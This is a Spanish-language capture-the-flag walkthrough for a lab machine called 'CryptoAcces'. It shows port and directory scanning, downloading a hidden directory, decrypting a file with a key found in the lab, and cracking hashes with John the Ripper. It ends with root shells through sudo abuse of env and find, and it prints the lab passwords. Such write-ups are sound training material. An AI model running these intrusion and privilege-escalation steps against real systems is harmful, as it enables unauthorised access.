---
description: '✍️ Autor: beafn28🔍 Dificultad: Medio📅 Fecha de creación: 26/09/2024'
hidden: true
---

# CryptoAcces

```bash
┌──(beafn28㉿kali)-[~/Desktop]
└─$ openssl enc -aes-256-cbc -d -in ~/Desktop/alice_aes.enc -out ~/Desktop/alice_password.txt -k 'supercomplexkey!' -iter 10000
```

wget -r -np -nH --cut-dirs=2 --reject "index.html\*" http://172.17.0.2/hidden/

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../.gitbook/assets/imagen (58).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../.gitbook/assets/imagen (59).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 172.17.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../.gitbook/assets/imagen (60).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web nos mencione una pista y descubrimos la página por defecto de Apache.

Ahora buscaremos directorios con la herramienta **Gobuster** a través de:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

<figure><img src="../.gitbook/assets/imagen (61).png" alt=""><figcaption></figcaption></figure>

Descubrimos un directorio oculto llamado `/hidden` por lo que indagamos qué contenido habrá.

<figure><img src="../.gitbook/assets/imagen (62).png" alt=""><figcaption></figcaption></figure>

Observamos varios archivos por lo que nos los descargamos e indagaremos más a fondo pero tiene pinta que hay trata de criptografía.

```
wget -r -np -nH --cut-dirs=2 --reject "index.html*" http://172.17.0.2/hidden/
```

### 🚀 **EXPLOTACIÓN**

Con la información obtenida anteriormente, realizamos el comando:

<pre class="language-bash"><code class="lang-bash"><strong>openssl enc -aes-256-cbc -d -in ~/Desktop/alice_aes.enc -out ~/Desktop/alice_password.txt -k 'supercomplexkey!' -iter 10000
</strong></code></pre>

```
openssl enc -aes-256-cbc -d -in ~/Desktop/alice_aes.enc -out ~/Desktop/alice_password.txt -k 'supercomplexkey!' -pbkdf2
```

Descifra el archivo `alice_aes.enc` utilizando AES-256-CBC con la clave `supercomplexkey!`,y guarda el resultado en el archivo `alice_password.txt`. La opción de iteración asegura que el proceso de derivación de la clave sea más seguro al hacerlo más difícil de atacar por fuerza bruta.

> Nota: la clave se encuentra en el archivo numeros\_suerte.txt

Hemos descubierto de **alice** que es **superSecurePassword!**

Vamos a descubrir las credenciales del usuario **bob**, al parecer hay varios hashes por lo que los vamos a crackear.

Nos aseguramos de tener todos los hashes de las contraseñas de Bob en un solo archivo. Combinamos los hashes en un único archivo de texto usando el siguiente comando:

```bash
cat bob_password*.hash > bob_passwords.hash
```

Utilizamos John the Ripper para intentar crackear las contraseñas.

```bash
john --wordlist=/usr/share/john/password.lst bob_passwords.hash
```

<figure><img src="../.gitbook/assets/imagen (64).png" alt=""><figcaption></figcaption></figure>

Desciframos estos hashes y se nos proporciona 3 contraseñas y al probar vemos que **letmein** es la correcta. Toca iniciar sesión de los dos usuarios a través del servicio **SSH**.

<figure><img src="../.gitbook/assets/imagen (65).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/imagen (66).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../.gitbook/assets/imagen (67).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/imagen (68).png" alt=""><figcaption></figcaption></figure>

#### 1. **Escalada de privilegios con `env` (Bob)**

El binario `/usr/bin/env` puede ser utilizado para escalar privilegios cuando tiene permisos de sudo sin contraseña. A continuación te muestro cómo podrías hacerlo siguiendo los pasos proporcionados por **GTFObins**.

**Comando de GTFObins (env) para obtener una shell de root:**

```bash
sudo /usr/bin/env /bin/sh
```

* Este comando ejecuta el binario `/bin/sh` con privilegios de root mediante `sudo` y `env`, dándote una shell de root.
* Una vez ejecutado, tendrás acceso root en la máquina.

#### 2. **Escalada de privilegios con `find` (Alice)**

De forma similar, el comando `find` también puede ser explotado para obtener una shell con privilegios elevados si tiene permisos de sudo.

**Comando de GTFObins (find) para obtener una shell de root:**

```bash
sudo find . -exec /bin/sh \; -quit
```

* Este comando usa `find` para ejecutar `/bin/sh` con privilegios de root utilizando `sudo`.
* El flag `-exec` permite ejecutar el comando `/bin/sh`, y `-quit` detiene el comando `find` una vez que la shell ha sido lanzada.

<figure><img src="../.gitbook/assets/imagen (69).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/imagen (70).png" alt=""><figcaption></figcaption></figure>

Ya somos **root** por lo que ahora encontraremos la bandera en sus directorios.
